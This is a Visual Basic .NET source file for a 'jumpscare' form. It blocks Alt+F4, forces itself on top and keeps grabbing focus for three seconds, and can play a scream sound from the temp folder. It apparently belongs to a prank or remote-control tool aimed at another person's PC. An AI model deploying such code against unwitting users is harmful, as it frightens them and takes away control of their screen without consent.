Imports System
Imports System.Deployment
Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Timers
Imports j
Imports Microsoft.VisualBasic
Imports System.Runtime.InteropServices

Public Class frmSustos

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        'prevent alt + f4 on the form
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property


    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer

    Friend Sub MakeTopMostWindow(ByVal hwnd As Int64, ByVal MakeTopMostFlag As Boolean)

        Dim HWND_TOPMOST As Integer
        If MakeTopMostFlag Then
            HWND_TOPMOST = -1
        Else
            HWND_TOPMOST = -2
        End If

        Dim SWP_NOMOVE As Integer = &H2
        Dim SWP_NOSIZE As Integer = &H1
        Dim TOPMOST_FLAGS As Integer = SWP_NOMOVE Or SWP_NOSIZE
        Try
            SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS)
        Catch ex As Exception
        End Try

    End Sub



    Private Sub frmSustos_Load(sender As Object, e As EventArgs) Handles Me.Load
        'yeah, i dont know what im doing here <3 
        Me.BringToFront()
        Me.Activate()
        Me.Focus()
        Me.TopMost = True
        Me.BringToFront()
        Me.Activate()
        Me.Focus()
        MakeTopMostWindow(Me.Handle.ToInt64, True)
        Application.DoEvents()
        MakeTopMostWindow(Me.Handle.ToInt64, False)

        If OK.SCREAM = "on" Then
            Try
                My.Computer.Audio.Play(Interaction.Environ("temp") & "\" & "scream.wav")
            Catch ex As Exception

            End Try

        End If



        Try
            Dim PARADA As New Stopwatch
            PARADA.Start()
            Do While PARADA.ElapsedMilliseconds < 3000
                Me.BringToFront()
                Me.Activate()
                Me.Focus()
                Application.DoEvents()
            Loop
            PARADA.Stop()
            Me.Close()
        Catch ex As Exception
        Finally
            Me.Close()
        End Try
    End Sub
End Class